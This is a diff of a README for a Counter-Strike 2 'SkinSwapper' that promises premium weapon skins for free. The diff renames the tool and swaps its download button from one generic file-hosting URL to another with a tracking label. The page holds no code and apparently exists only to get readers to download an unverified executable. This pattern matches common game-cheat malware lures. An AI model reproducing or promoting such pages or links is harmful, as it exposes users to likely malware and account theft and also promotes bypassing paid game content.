@@ -1,6 +1,6 @@
-# CS2 SkinChanger 🎨🔫
+# CS2 SkinSwapper 🎨🔫
 
-**CS2 SkinChanger** is a powerful tool for *Counter-Strike 2* that allows you to change in-game skins effortlessly. With this SkinSwapper, you can customize your loadout by swapping default skins with premium ones, giving your weapons and equipment a fresh, unique look without spending real money.
+**CS2 SkinSwapper** is a powerful tool for *Counter-Strike 2* that allows you to change in-game skins effortlessly. With this SkinSwapper, you can customize your loadout by swapping default skins with premium ones, giving your weapons and equipment a fresh, unique look without spending real money.
 
 ## ⚡ Features:
 - **Easy Skin Swapping:** Instantly swap any weapon or equipment skin with just a few clicks.
@@ -15,5 +15,4 @@
 2. Choose a skin from the library or customize it to your liking.
 3. Apply the skin and enjoy a personalized gaming experience!
 
-
-[![Download CS2 SkinSwapper](https://img.shields.io/badge/Download-CS2%20SkinSwapper-blueviolet)](https://downeefiles.com/s/c2swpper)
+[![Download CS2 SkinSwapper](https://img.shields.io/badge/Download-CS2%20SkinSwapper-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
